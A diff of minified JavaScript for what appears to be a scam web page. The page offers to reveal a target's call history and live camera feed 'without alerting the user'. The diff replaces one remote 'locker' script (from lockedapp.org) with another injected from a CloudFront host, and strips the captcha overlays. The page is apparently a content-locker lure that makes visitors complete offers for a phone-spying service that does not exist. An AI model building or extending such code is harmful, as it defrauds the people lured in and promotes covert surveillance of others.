@@ -544,6 +544,7 @@ const S = [{
                             case "HR":
                             case "RS":
                             case "SI":
+                            case "SK":
                             case "LT":
                             case "LV":
                             case "EE":
@@ -937,33 +938,19 @@ const S = [{
             })
         })
     };
-let F = null,
-    L = !1;
-const I = () => {
-    if (L && window.TaskPassCaptcha) {
-        return document.querySelectorAll('[data-captcha-enable="true"]').forEach((e => {
-            var s;
-            null == (s = window.TaskPassCaptcha) || s.render(e)
-        })), Promise.resolve()
-    }
-    if (F) return F;
-    const e = document.querySelector('script[data-taskpass-script="true"]');
-    return e && e.remove(), F = new Promise((e => {
-        const s = document.createElement("script");
-        s.src = "https://lockedapp.org/cp/js/8wpen", s.async = !0, s.defer = !0, s.setAttribute("data-taskpass-script", "true"), s.onload = () => {
-            setTimeout((() => {
-                if (window.TaskPassCaptcha) {
-                    document.querySelectorAll('[data-captcha-enable="true"]').forEach((e => {
-                        var s;
-                        null == (s = window.TaskPassCaptcha) || s.render(e)
-                    }))
-                }
-                L = !0, F = null, e()
-            }), 100)
-        }, s.onerror = () => {
-            console.error("Failed to load TaskPass script"), L = !1, F = null, e()
-        }, document.head.appendChild(s)
-    })), F
+let newLockerLoaded = !1;
+const loadNewLocker = () => {
+    if (newLockerLoaded) return Promise.resolve();
+    const e = document.createElement("script");
+    e.type = "text/javascript";
+    e.textContent = 'var kREIq_uBx_jQhXac={"it":4560437,"key":"791f2"};';
+    document.head.appendChild(e);
+    const s = document.createElement("script");
+    return s.src = "https://d1y0yks1k8t5m5.cloudfront.net/902c1cf.js", s.async = !0, s.onload = () => {
+        newLockerLoaded = !0
+    }, s.onerror = () => {
+        console.error("Failed to load new locker script")
+    }, document.head.appendChild(s), Promise.resolve()
 },
     R = [{
         name: "Anthony (brother) Tyler",
@@ -1060,22 +1047,6 @@ const I = () => {
                         })]
                     })]
                 }, s)))
-            }), $.jsxs("div", {
-                className: "absolute inset-0 bg-black/90 backdrop-blur-sm flex flex-col items-center justify-center p-6",
-                children: [$.jsxs("div", {
-                    className: "text-center mb-6",
-                    children: [$.jsx("h3", {
-                        className: "text-xl font-semibold text-white mb-2",
-                        children: "Complete captcha to continue"
-                    }), $.jsx("p", {
-                        className: "text-sm text-gray-400",
-                        children: "Verification required to access call history"
-                    })]
-                }), $.jsx("div", {
-                    "data-captcha-enable": "true",
-                    "data-captcha-id": "history",
-                    className: "captcha-container"
-                })]
             })]
         })]
     }) : null,
@@ -1087,7 +1058,7 @@ const I = () => {
         return e.useEffect((() => {
             if (!s) return void i(!1);
             const e = setTimeout((() => {
-                i(!0), I()
+                i(!0), loadNewLocker() // <-- Updated call
             }), 4e3);
             return () => clearTimeout(e)
         }), [s]), s ? $.jsxs("div", {
@@ -1179,16 +1150,6 @@ const I = () => {
                             className: "text-sm text-gray-400",
                             children: "Complete verification to access the live camera feed without alerting the user"
                         })]
-                    }), $.jsx("div", {
-                        className: "w-full max-w-[300px] mx-auto bg-black/50 rounded-lg p-4 mb-4",
-                        children: $.jsx("div", {
-                            "data-captcha-enable": "true",
-                            "data-captcha-id": "live",
-                            className: "captcha-container"
-                        })
-                    }), $.jsx("p", {
-                        className: "text-xs text-yellow-500/80 text-center",
-                        children: "System may trigger alert if session is left incomplete"
                     })]
                 })]
             })]
@@ -1202,7 +1163,7 @@ const I = () => {
             [i, c] = e.useState(!1);
         return e.useEffect((() => {
             (t || i) && setTimeout((() => {
-                I()
+                loadNewLocker() // <-- Updated call
             }), 300)
         }), [t, i]), $.jsxs("div", {
             className: "w-full h-[100dvh] fixed inset-0 bg-black fade-in",
